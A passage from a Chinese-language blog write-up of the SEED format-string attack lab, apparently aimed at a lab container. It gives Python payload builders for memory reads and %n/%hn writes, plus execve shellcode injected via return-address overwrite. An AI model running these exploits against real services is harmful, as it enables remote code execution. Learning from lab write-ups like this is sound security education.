<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dcbuild     <span class="comment"># Alias for: docker-compose build</span></span><br><span class="line">dcup        <span class="comment"># Alias for: docker-compose up</span></span><br><span class="line">dcdown      <span class="comment"># Alias for: docker-compose down</span></span><br><span class="line">dockps      <span class="comment"># Alias for: docker ps --format &quot;&#123;&#123;.ID&#125;&#125; &#123;&#123;.Names&#125;&#125;&quot;</span></span><br><span class="line">docksh &lt;id&gt; <span class="comment"># Alias for: docker exec -it &lt;id&gt; /bin/bas</span></span><br></pre></td></tr></table></figure>

<h2 id="3-Task-1-Crashing-the-Program"><a href="#3-Task-1-Crashing-the-Program" class="headerlink" title="3 Task 1: Crashing the Program"></a>3 Task 1: Crashing the Program</h2><p>我们使用<code>10.9.0.5</code>服务器，它运行着一个32-bit的<code>format</code>程序。</p>
<p>服务器最多接受1500字节的数据，在这个任务中，我们需要通过构造<code>payload</code>作为输入让程序崩溃（此时服务器不会崩溃，因为<code>format</code>程序是<code>server</code>产生的一个子进程）</p>
<p>查看<code>attack-code</code>目录下的<code>build_string.py</code>文件，它展示了如何将各种类型的数据放入字符串中</p>
<ol>
<li>尝试一次普通的输入<br><img src="/2021/12/01/SEED_lab4/image-20211201131716368.png" alt="image-20211201131716368"></li>
<li>恶意输入，导致程序没有成功放回。<br><img src="/2021/12/01/SEED_lab4/image-20211201133231273.png" alt="image-20211201133231273"></li>
</ol>
<p>原理：我们的输入作为格式化字符串，那么%s代表字符串，函数执行时会寻找函数指针所指向函数参数值作为字符串地址，而现在这个值是不可读的，会造成段错误，程序崩溃。</p>
<h2 id="4-Task-2-Printing-Out-the-Server-Program’s-Memory"><a href="#4-Task-2-Printing-Out-the-Server-Program’s-Memory" class="headerlink" title="4 Task 2: Printing Out the Server Program’s Memory"></a>4 Task 2: Printing Out the Server Program’s Memory</h2><p>这个任务的目标是让服务器从它的内存中打印出一些数据（我们将继续使用10.9.0.5）</p>
<p>数据将在服务器端打印出来，因此攻击者无法看到它。</p>
<p>这不是一个有意义的攻击，但是在这个任务中使用的技术对于后续的任务是至关重要的</p>
<h3 id="Task-2-A-Stack-Data"><a href="#Task-2-A-Stack-Data" class="headerlink" title="Task 2.A: Stack Data."></a>Task 2.A: Stack Data.</h3><p>2.A目标是打印堆栈上的数据。</p>
<p>我们需要知道多少个 <code>％.8x</code> 格式说明符，才可以获得服务器程序打印出输入的前四个字节，为了更加明显我们设置一个比较特殊的值。</p>
<p>以此为例，说明我们是如何去寻找我们需要的地址：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="comment"># Initialize the content array</span></span><br><span class="line">N = <span class="number">1500</span></span><br><span class="line">content = <span class="built_in">bytearray</span>(<span class="number">0x0</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(N))</span><br><span class="line"></span><br><span class="line"><span class="comment"># This line shows how to store a 4-byte integer at offset 0</span></span><br><span class="line">number  = <span class="number">0xffffffff</span> </span><br><span class="line">content[<span class="number">0</span>:<span class="number">4</span>]  =  (number).to_bytes(<span class="number">4</span>,byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># This line shows how to store a 4-byte string at offset 4</span></span><br><span class="line">content[<span class="number">4</span>:<span class="number">8</span>]  =  (<span class="string">&quot;abcd&quot;</span>).encode(<span class="string">&#x27;latin-1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># This line shows how to construct a string s with</span></span><br><span class="line"><span class="comment">#   12 of &quot;%.8x&quot;, concatenated with a &quot;%n&quot;</span></span><br><span class="line">s = <span class="string">&quot;%.8x.&quot;</span>*<span class="number">100</span>  <span class="comment"># +&quot;%s&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># The line shows how to store the string s at offset 8</span></span><br><span class="line">fmt  = (s).encode(<span class="string">&#x27;latin-1&#x27;</span>)</span><br><span class="line">content[<span class="number">8</span>:<span class="number">8</span>+<span class="built_in">len</span>(fmt)] = fmt</span><br><span class="line"></span><br><span class="line"><span class="comment"># Write the content to badfile</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;badfile&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">  f.write(content)</span><br></pre></td></tr></table></figure>

<p><img src="/2021/12/01/SEED_lab4/image-20211201154615942.png" alt="image-20211201154615942"></p>
<p>我们可以看到，我们设置的<code>0xfffffff</code>位于<code>64</code>个<code>%.8x</code>位置处，也就是说buffer的前四个字节在这个位置。</p>
<h3 id="Task-2-B-Heap-Data"><a href="#Task-2-B-Heap-Data" class="headerlink" title="Task 2.B: Heap Data"></a>Task 2.B: Heap Data</h3><p>堆区域中存有一个秘密消息（字符串），我们可以从服务器打印输出找到此字符串的地址。我们的任务是打印出此秘密信息。</p>
<p>从上图中，我们可以知道<code>secret message&#39;s address</code>是<code>0x080b4008</code>，然后buffer前四个字节位于第<code>64</code>个<code>%.8x</code>处。</p>
<p>所以构造<code>payload</code>如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="comment"># Initialize the content array</span></span><br><span class="line">N = <span class="number">1500</span></span><br><span class="line">content = <span class="built_in">bytearray</span>(<span class="number">0x0</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(N))</span><br><span class="line"></span><br><span class="line"><span class="comment"># This line shows how to store a 4-byte integer at offset 0</span></span><br><span class="line">number  = <span class="number">0x080b4008</span></span><br><span class="line">content[<span class="number">0</span>:<span class="number">4</span>]  =  (number).to_bytes(<span class="number">4</span>,byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># This line shows how to store a 4-byte string at offset 4</span></span><br><span class="line">content[<span class="number">4</span>:<span class="number">8</span>]  =  (<span class="string">&quot;abcd&quot;</span>).encode(<span class="string">&#x27;latin-1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># This line shows how to construct a string s with</span></span><br><span class="line"><span class="comment">#   12 of &quot;%.8x&quot;, concatenated with a &quot;%n&quot;</span></span><br><span class="line">s = <span class="string">&quot;%.8x&quot;</span>*<span class="number">63</span>   +<span class="string">&quot;%s&quot;</span> </span><br><span class="line"></span><br><span class="line"><span class="comment"># The line shows how to store the string s at offset 8</span></span><br><span class="line">fmt  = (s).encode(<span class="string">&#x27;latin-1&#x27;</span>)</span><br><span class="line">content[<span class="number">8</span>:<span class="number">8</span>+<span class="built_in">len</span>(fmt)] = fmt</span><br><span class="line"></span><br><span class="line"><span class="comment"># Write the content to badfile</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;badfile&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">  f.write(content)</span><br></pre></td></tr></table></figure>

<p><img src="/2021/12/01/SEED_lab4/image-20211201153850652.png" alt="image-20211201153850652"></p>
<p>原理：设置buffer的前四个字节为隐藏字符串地址<code>0x080b4008</code>，然后我们通过<code>%s</code>输出位于堆上的隐藏字符串</p>
<h2 id="5-Task-3-Modifying-the-Server-Program’s-Memory"><a href="#5-Task-3-Modifying-the-Server-Program’s-Memory" class="headerlink" title="5 Task 3: Modifying the Server Program’s Memory"></a>5 Task 3: Modifying the Server Program’s Memory</h2><p>这个任务的目标是修改服务器程序中定义的<code>target</code>变量的值(我们将继续使用10.9.0.5)。</p>
<p><code>target</code>的原始值是<code>0x11223344</code>。假设该变量包含一个重要的值，该值可以影响程序的控制流。如果远程攻击者可以改变它的值，他们就可以改变这个程序的行为。</p>
<p>我们有三个子任务。</p>
<h3 id="Task-3-A-Change-the-value-to-a-different-value"><a href="#Task-3-A-Change-the-value-to-a-different-value" class="headerlink" title="Task 3.A: Change the value to a different value."></a>Task 3.A: Change the value to a different value.</h3><p>在这个子任务中，我们需要将<code>target</code>变量的内容更改为其他内容。</p>
<p>如果您可以将任务更改为不同的值(不管它可能是什么值)，那么您的任务将被视为成功。目标变量的地址可以从服务器打印输出中找到。</p>
<p>从以上图中，我们可以知道<code>target</code>变量的地址为<code>0x080e5068</code>，我们通过<code>%n</code>修改该地址的值，构造payload如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="comment"># Initialize the content array</span></span><br><span class="line">N = <span class="number">1500</span></span><br><span class="line">content = <span class="built_in">bytearray</span>(<span class="number">0x0</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(N))</span><br><span class="line"></span><br><span class="line"><span class="comment"># This line shows how to store a 4-byte integer at offset 0</span></span><br><span class="line">number  = <span class="number">0x080e5068</span></span><br><span class="line">content[<span class="number">0</span>:<span class="number">4</span>]  =  (number).to_bytes(<span class="number">4</span>,byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># This line shows how to store a 4-byte string at offset 4</span></span><br><span class="line">content[<span class="number">4</span>:<span class="number">8</span>]  =  (<span class="string">&quot;abcd&quot;</span>).encode(<span class="string">&#x27;latin-1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># This line shows how to construct a string s with</span></span><br><span class="line"><span class="comment">#   12 of &quot;%.8x&quot;, concatenated with a &quot;%n&quot;</span></span><br><span class="line">s = <span class="string">&quot;%.8x&quot;</span>*<span class="number">63</span>   +<span class="string">&quot;%n&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># The line shows how to store the string s at offset 8</span></span><br><span class="line">fmt  = (s).encode(<span class="string">&#x27;latin-1&#x27;</span>)</span><br><span class="line">content[<span class="number">8</span>:<span class="number">8</span>+<span class="built_in">len</span>(fmt)] = fmt</span><br><span class="line"></span><br><span class="line"><span class="comment"># Write the content to badfile</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;badfile&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">  f.write(content)</span><br></pre></td></tr></table></figure>

<p><img src="/2021/12/01/SEED_lab4/image-20211201160351368.png" alt="image-20211201160351368"></p>
<p>这个值为什么被修改为<code>0x200</code>？</p>
<p>我们需要了解<code>%n</code>的用法，它会修改对应参数地址四个字节的值，将它修改为在它之前规格字符串打印结果的字符串长度</p>
<p>所以在<code>%n</code>之前，我们先打印了4位宽的target变量的地址，然后打印了4位宽的<code>abcd</code>，再然后是<code>&quot;%.8x&quot;*63</code>也就是8位宽的二进制值打印了63次</p>
<p>所以最后$0x4+0x4+0x8\times63=0x200$，<code>%n</code>将它赋给target。</p>
<h3 id="Task-3-B-Change-the-value-to-0x5000"><a href="#Task-3-B-Change-the-value-to-0x5000" class="headerlink" title="Task 3.B: Change the value to 0x5000"></a>Task 3.B: Change the value to 0x5000</h3><p>因为$0x5000-0x200=19968$，<code>%n</code>会计算之前的字符数，所以我们需要再多加19968个字符，同时需要注意的是，不能改变<code>va_list</code>指针指向的地址，也就是需要用<code>%n</code>修改的<code>target</code>变量的地址。</p>
<p>构造的payload如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="comment"># Initialize the content array</span></span><br><span class="line">N = <span class="number">1500</span></span><br><span class="line">content = <span class="built_in">bytearray</span>(<span class="number">0x0</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(N))</span><br><span class="line"></span><br><span class="line"><span class="comment"># This line shows how to store a 4-byte integer at offset 0</span></span><br><span class="line">number  = <span class="number">0x080e5068</span> </span><br><span class="line">content[<span class="number">0</span>:<span class="number">4</span>]  =  (number).to_bytes(<span class="number">4</span>,byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># This line shows how to store a 4-byte string at offset 4</span></span><br><span class="line">content[<span class="number">4</span>:<span class="number">8</span>]  =  (<span class="string">&quot;abcd&quot;</span>).encode(<span class="string">&#x27;latin-1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># This line shows how to construct a string s with</span></span><br><span class="line"><span class="comment">#   12 of &quot;%.8x&quot;, concatenated with a &quot;%n&quot;</span></span><br><span class="line">s = <span class="string">&quot;%.8x&quot;</span>*<span class="number">62</span> + <span class="string">&quot;%.19976x&quot;</span>  +<span class="string">&quot;%n&quot;</span> </span><br><span class="line"></span><br><span class="line"><span class="comment"># The line shows how to store the string s at offset 8</span></span><br><span class="line">fmt  = (s).encode(<span class="string">&#x27;latin-1&#x27;</span>)</span><br><span class="line">content[<span class="number">8</span>:<span class="number">8</span>+<span class="built_in">len</span>(fmt)] = fmt</span><br><span class="line"></span><br><span class="line"><span class="comment"># Write the content to badfile</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;badfile&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">  f.write(content)</span><br></pre></td></tr></table></figure>

<p>我们将一个<code>%.8x</code>变成$19968+8=19976$个字符宽度的<code>%.19976x</code>，其实读的还是八个字符，但是宽度为<code>19976</code>的宽度，这样可以保证<code>%n</code>对应地址不变的情况下，改变<code>target</code>对应的值。</p>
<p><img src="/2021/12/01/SEED_lab4/image-20211201163323178.png" alt="image-20211201163323178"></p>
<h3 id="Task-3-C-Change-the-value-to-0xAABBCCDD"><a href="#Task-3-C-Change-the-value-to-0xAABBCCDD" class="headerlink" title="Task 3.C: Change the value to 0xAABBCCDD."></a>Task 3.C: Change the value to 0xAABBCCDD.</h3><p>这个不能直接修改整个target，因为要输出的字符太多了，电脑会卡而且耗时又长。</p>
<p>我们可以将<code>target</code>分成两个2字节部分去覆盖，payload如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="comment"># Initialize the content array</span></span><br><span class="line">N = <span class="number">1500</span></span><br><span class="line">content = <span class="built_in">bytearray</span>(<span class="number">0x0</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(N))</span><br><span class="line"></span><br><span class="line">number  = <span class="number">0x080e5068</span> <span class="comment"># target地址（小端法，读两个字节就是0x5068）</span></span><br><span class="line">number2 = number+<span class="number">2</span>   <span class="comment"># target前2个字节地址</span></span><br><span class="line">content[<span class="number">0</span>:<span class="number">4</span>]  =  (number2).to_bytes(<span class="number">4</span>,byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line">content[<span class="number">8</span>:<span class="number">12</span>]  =  (number).to_bytes(<span class="number">4</span>,byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># This line shows how to store a 4-byte string at offset 4</span></span><br><span class="line">content[<span class="number">4</span>:<span class="number">8</span>]  =  (<span class="string">&quot;abcd&quot;</span>).encode(<span class="string">&#x27;latin-1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># This line shows how to construct a string s with</span></span><br><span class="line"><span class="comment">#   12 of &quot;%.8x&quot;, concatenated with a &quot;%n&quot;</span></span><br><span class="line">s = <span class="string">&quot;%.8x&quot;</span>*<span class="number">62</span> + <span class="string">&quot;%.43191x&quot;</span> + <span class="string">&quot;%hn&quot;</span> +<span class="string">&quot;%.8738x&quot;</span>  +<span class="string">&quot;%hn&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># The line shows how to store the string s at offset 8</span></span><br><span class="line">fmt  = (s).encode(<span class="string">&#x27;latin-1&#x27;</span>)</span><br><span class="line">content[<span class="number">12</span>:<span class="number">12</span>+<span class="built_in">len</span>(fmt)] = fmt</span><br><span class="line"></span><br><span class="line"><span class="comment"># Write the content to badfile</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;badfile&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">  f.write(content)</span><br></pre></td></tr></table></figure>

<p>因为增加了一个四位宽的地址，所以现在的输出字符宽度为$0x200+0x4=0x204$</p>
<p>$0xAABB-0x204=43191$，将一个<code>%.8x</code>变为<code>%.43199x</code>，将前2个字节设置为<code>AABB</code></p>
<p>$0xCCDD-0xAABB=8738$，同时因为<code>%hn</code>不输出，所以再加上<code>%.8738x</code>，将后2个字节位设置为<code>CCDD</code></p>
<p><img src="/2021/12/01/SEED_lab4/image-20211201181512161.png" alt="image-20211201181512161"></p>
<h2 id="6-Task-4-Inject-Malicious-Code-into-the-Server-Program"><a href="#6-Task-4-Inject-Malicious-Code-into-the-Server-Program" class="headerlink" title="6 Task 4: Inject Malicious Code into the Server Program"></a>6 Task 4: Inject Malicious Code into the Server Program</h2><p>现在，我们已经准备好开始攻击的核心——代码注入。</p>
<p>我们想要将一段恶意代码以二进制格式注入到服务器的内存中，然后使用格式字符串漏洞修改函数的返回地址字段，这样当函数返回时，它跳转到我们注入的代码。</p>
<p>此任务使用的技术与前一个任务相似：它们都修改内存中的4字节数。前一个任务修改目标变量，而这个任务修改函数的返回地址字段。</p>
<h3 id="6-1-Understanding-the-Stack-Layout"><a href="#6-1-Understanding-the-Stack-Layout" class="headerlink" title="6.1 Understanding the Stack Layout"></a>6.1 Understanding the Stack Layout</h3><p>为了完成这项任务，当在 <code>myprintf()</code> 内部调用 <code>printf()</code> 函数时，有必要理解堆栈布局。</p>
<p>在完成这项任务之前，参照给出的栈帧，回答以下问题：</p>
<p><img src="/2021/12/01/SEED_lab4/image-20211201185313210.png" alt="image-20211201185313210"></p>
<h4 id="Question-1-What-are-the-memory-addresses-at-the-locations-marked-by-2-and-3"><a href="#Question-1-What-are-the-memory-addresses-at-the-locations-marked-by-2-and-3" class="headerlink" title="Question 1: What are the memory addresses at the locations marked by 2 and 3?"></a>Question 1: What are the memory addresses at the locations marked by 2 and 3?</h4><p>3 是<code>buf</code>的地址，从服务器返回数据中，我们可以直接得到地址：<code>0xffffd0d0</code></p>
<p>2 是<code>myprintf()</code>的返回地址，服务器返回数据中，<code>myprintf()</code>的<code>frame pointer</code>是<code>0xffffd018</code>，所以<code>return address</code>是：<code>0xffffd018+4=0xffffd01c</code></p>
<h4 id="Question-2-How-many-x-format-specifiers-do-we-need-to-move-the-format-string-argument-pointer-to-3-Remember-the-argument-pointer-starts-from-the-location-above-1"><a href="#Question-2-How-many-x-format-specifiers-do-we-need-to-move-the-format-string-argument-pointer-to-3-Remember-the-argument-pointer-starts-from-the-location-above-1" class="headerlink" title="Question 2: How many %x format specifiers do we need to move the format string argument pointer to 3? Remember, the argument pointer starts from the location above  1."></a>Question 2: How many %x format specifiers do we need to move the format string argument pointer to 3? Remember, the argument pointer starts from the location above  1.</h4><p>我们需要 64 个<code>%x</code>才能移动格式化字符串的参数指针到 3 ，也就是<code>buf</code>的地址。</p>
<h3 id="6-2-Shellcode"><a href="#6-2-Shellcode" class="headerlink" title="6.2 Shellcode"></a>6.2 Shellcode</h3><p>shellcode 通常用于代码注入攻击。它是一个get shell的代码，通常用汇编语言编写。</p>
<p>32-bit 和64-bit 版本的shellcode都包含在<code>attack-code</code>目录中的<code>exproit.py</code>中。我们可以使用它们来构造格式字符串。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 32-bit Generic Shellcode </span></span><br><span class="line">shellcode_32 = (</span><br><span class="line">   <span class="string">&quot;\xeb\x29\x5b\x31\xc0\x88\x43\x09\x88\x43\x0c\x88\x43\x47\x89\x5b&quot;</span></span><br><span class="line">   <span class="string">&quot;\x48\x8d\x4b\x0a\x89\x4b\x4c\x8d\x4b\x0d\x89\x4b\x50\x89\x43\x54&quot;</span></span><br><span class="line">   <span class="string">&quot;\x8d\x4b\x48\x31\xd2\x31\xc0\xb0\x0b\xcd\x80\xe8\xd2\xff\xff\xff&quot;</span></span><br><span class="line">   <span class="string">&quot;/bin/bash*&quot;</span></span><br><span class="line">   <span class="string">&quot;-c*&quot;</span></span><br><span class="line">   <span class="comment"># The * in this line serves as the position marker         *</span></span><br><span class="line">   <span class="string">&quot;/bin/ls -l; echo &#x27;===== Success! ======&#x27;                  *&quot;</span></span><br><span class="line">   <span class="string">&quot;AAAA&quot;</span>   <span class="comment"># Placeholder for argv[0] --&gt; &quot;/bin/bash&quot;</span></span><br><span class="line">   <span class="string">&quot;BBBB&quot;</span>   <span class="comment"># Placeholder for argv[1] --&gt; &quot;-c&quot;</span></span><br><span class="line">   <span class="string">&quot;CCCC&quot;</span>   <span class="comment"># Placeholder for argv[2] --&gt; the command string</span></span><br><span class="line">   <span class="string">&quot;DDDD&quot;</span>   <span class="comment"># Placeholder for argv[3] --&gt; NULL</span></span><br><span class="line">).encode(<span class="string">&#x27;latin-1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 64-bit Generic Shellcode </span></span><br><span class="line">shellcode_64 = (</span><br><span class="line">   <span class="string">&quot;\xeb\x36\x5b\x48\x31\xc0\x88\x43\x09\x88\x43\x0c\x88\x43\x47\x48&quot;</span></span><br><span class="line">   <span class="string">&quot;\x89\x5b\x48\x48\x8d\x4b\x0a\x48\x89\x4b\x50\x48\x8d\x4b\x0d\x48&quot;</span></span><br><span class="line">   <span class="string">&quot;\x89\x4b\x58\x48\x89\x43\x60\x48\x89\xdf\x48\x8d\x73\x48\x48\x31&quot;</span></span><br><span class="line">   <span class="string">&quot;\xd2\x48\x31\xc0\xb0\x3b\x0f\x05\xe8\xc5\xff\xff\xff&quot;</span></span><br><span class="line">   <span class="string">&quot;/bin/bash*&quot;</span></span><br><span class="line">   <span class="string">&quot;-c*&quot;</span></span><br><span class="line">   <span class="comment"># The * in this line serves as the position marker         *</span></span><br><span class="line">   <span class="string">&quot;/bin/ls -l; echo &#x27;===== Success! ======&#x27;                  *&quot;</span></span><br><span class="line">   <span class="string">&quot;AAAAAAAA&quot;</span>   <span class="comment"># Placeholder for argv[0] --&gt; &quot;/bin/bash&quot;</span></span><br><span class="line">   <span class="string">&quot;BBBBBBBB&quot;</span>   <span class="comment"># Placeholder for argv[1] --&gt; &quot;-c&quot;</span></span><br><span class="line">   <span class="string">&quot;CCCCCCCC&quot;</span>   <span class="comment"># Placeholder for argv[2] --&gt; the command string</span></span><br><span class="line">   <span class="string">&quot;DDDDDDDD&quot;</span>   <span class="comment"># Placeholder for argv[3] --&gt; NULL</span></span><br><span class="line">).encode(<span class="string">&#x27;latin-1&#x27;</span>)</span><br></pre></td></tr></table></figure>



<h3 id="6-3-Your-Task"><a href="#6-3-Your-Task" class="headerlink" title="6.3 Your Task"></a>6.3 Your Task</h3><p>注意：我这里的地址不同于前面回答中的地址，这是因为容器重启会随机改变地址，如果容器重启需要再次确认。</p>
<p><img src="/2021/12/01/SEED_lab4/image-20211201200344749.png" alt="image-20211201200344749"></p>
<p>我们的任务是构建badfile给服务器程序，让服务器执行shellcode。</p>
<p>payload如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="comment"># 32-bit Generic Shellcode </span></span><br><span class="line">shellcode_32 = (</span><br><span class="line">   <span class="string">&quot;\xeb\x29\x5b\x31\xc0\x88\x43\x09\x88\x43\x0c\x88\x43\x47\x89\x5b&quot;</span></span><br><span class="line">   <span class="string">&quot;\x48\x8d\x4b\x0a\x89\x4b\x4c\x8d\x4b\x0d\x89\x4b\x50\x89\x43\x54&quot;</span></span><br><span class="line">   <span class="string">&quot;\x8d\x4b\x48\x31\xd2\x31\xc0\xb0\x0b\xcd\x80\xe8\xd2\xff\xff\xff&quot;</span></span><br><span class="line">   <span class="string">&quot;/bin/bash*&quot;</span></span><br><span class="line">   <span class="string">&quot;-c*&quot;</span></span><br><span class="line">   <span class="comment"># The * in this line serves as the position marker         *</span></span><br><span class="line">   <span class="string">&quot;/bin/ls -l; echo &#x27;===== Success! ======&#x27;                  *&quot;</span></span><br><span class="line">   <span class="string">&quot;AAAA&quot;</span>   <span class="comment"># Placeholder for argv[0] --&gt; &quot;/bin/bash&quot;</span></span><br><span class="line">   <span class="string">&quot;BBBB&quot;</span>   <span class="comment"># Placeholder for argv[1] --&gt; &quot;-c&quot;</span></span><br><span class="line">   <span class="string">&quot;CCCC&quot;</span>   <span class="comment"># Placeholder for argv[2] --&gt; the command string</span></span><br><span class="line">   <span class="string">&quot;DDDD&quot;</span>   <span class="comment"># Placeholder for argv[3] --&gt; NULL</span></span><br><span class="line">).encode(<span class="string">&#x27;latin-1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 64-bit Generic Shellcode </span></span><br><span class="line">shellcode_64 = (</span><br><span class="line">   <span class="string">&quot;\xeb\x36\x5b\x48\x31\xc0\x88\x43\x09\x88\x43\x0c\x88\x43\x47\x48&quot;</span></span><br><span class="line">   <span class="string">&quot;\x89\x5b\x48\x48\x8d\x4b\x0a\x48\x89\x4b\x50\x48\x8d\x4b\x0d\x48&quot;</span></span><br><span class="line">   <span class="string">&quot;\x89\x4b\x58\x48\x89\x43\x60\x48\x89\xdf\x48\x8d\x73\x48\x48\x31&quot;</span></span><br><span class="line">   <span class="string">&quot;\xd2\x48\x31\xc0\xb0\x3b\x0f\x05\xe8\xc5\xff\xff\xff&quot;</span></span><br><span class="line">   <span class="string">&quot;/bin/bash*&quot;</span></span><br><span class="line">   <span class="string">&quot;-c*&quot;</span></span><br><span class="line">   <span class="comment"># The * in this line serves as the position marker         *</span></span><br><span class="line">   <span class="string">&quot;/bin/ls -l; echo &#x27;===== Success! ======&#x27;                  *&quot;</span></span><br><span class="line">   <span class="string">&quot;AAAAAAAA&quot;</span>   <span class="comment"># Placeholder for argv[0] --&gt; &quot;/bin/bash&quot;</span></span><br><span class="line">   <span class="string">&quot;BBBBBBBB&quot;</span>   <span class="comment"># Placeholder for argv[1] --&gt; &quot;-c&quot;</span></span><br><span class="line">   <span class="string">&quot;CCCCCCCC&quot;</span>   <span class="comment"># Placeholder for argv[2] --&gt; the command string</span></span><br><span class="line">   <span class="string">&quot;DDDDDDDD&quot;</span>   <span class="comment"># Placeholder for argv[3] --&gt; NULL</span></span><br><span class="line">).encode(<span class="string">&#x27;latin-1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">N = <span class="number">1500</span></span><br><span class="line"><span class="comment"># Fill the content with NOP&#x27;s</span></span><br><span class="line">content = <span class="built_in">bytearray</span>(<span class="number">0x90</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(N))</span><br><span class="line"></span><br><span class="line"><span class="comment"># Choose the shellcode version based on your target</span></span><br><span class="line">shellcode = shellcode_32</span><br><span class="line"></span><br><span class="line"><span class="comment"># Put the shellcode somewhere in the payload</span></span><br><span class="line">start = <span class="number">1500</span>-<span class="built_in">len</span>(shellcode)              <span class="comment"># Change this number</span></span><br><span class="line">content[start:start + <span class="built_in">len</span>(shellcode)] = shellcode</span><br><span class="line"><span class="built_in">print</span>(start)</span><br><span class="line"><span class="comment">############################################################</span></span><br><span class="line"><span class="comment"># This line shows how to store a 4-byte integer at offset 0</span></span><br><span class="line">number  = <span class="number">0xffffd35e</span></span><br><span class="line">content[<span class="number">0</span>:<span class="number">4</span>]  =  (number).to_bytes(<span class="number">4</span>,byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line">number2 = <span class="number">0xffffd35c</span></span><br><span class="line">content[<span class="number">8</span>:<span class="number">12</span>]  =  (number2).to_bytes(<span class="number">4</span>,byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># This line shows how to store a 4-byte string at offset 4</span></span><br><span class="line">content[<span class="number">4</span>:<span class="number">8</span>]  =  (<span class="string">&quot;abcd&quot;</span>).encode(<span class="string">&#x27;latin-1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># This line shows how to construct a string s with</span></span><br><span class="line"><span class="comment">#   12 of &quot;%.8x&quot;, concatenated with a &quot;%n&quot;</span></span><br><span class="line">s = <span class="string">&quot;%.8x&quot;</span>*<span class="number">62</span> + <span class="string">&quot;%.65027x&quot;</span> + <span class="string">&quot;%hn&quot;</span> +<span class="string">&quot;%.55685x&quot;</span>  +<span class="string">&quot;%hn&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># The line shows how to store the string s at offset 8</span></span><br><span class="line">fmt  = (s).encode(<span class="string">&#x27;latin-1&#x27;</span>)</span><br><span class="line">content[<span class="number">12</span>:<span class="number">12</span>+<span class="built_in">len</span>(fmt)] = fmt</span><br><span class="line"><span class="comment">############################################################</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Save the format string to file</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;badfile&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">  f.write(content)</span><br></pre></td></tr></table></figure>

<p>需要注意的地方有：</p>
<ul>
<li><code>myprintf()</code>的返回地址：$0xffffd358+0x4=0xffffd35c$</li>
